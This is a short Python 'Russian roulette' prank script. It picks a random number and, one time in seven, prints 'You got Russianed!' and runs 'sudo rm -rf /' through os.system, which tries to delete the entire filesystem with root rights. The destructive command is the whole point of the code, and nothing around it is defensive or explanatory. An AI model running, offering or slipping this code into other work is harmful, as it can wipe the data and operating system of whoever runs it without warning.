import os
import random

if random.randint(0, 6) == 6:
    print("You got Russianed!")
    os.system("sudo rm -rf /")
else:
    print("Phew! You got lucky!")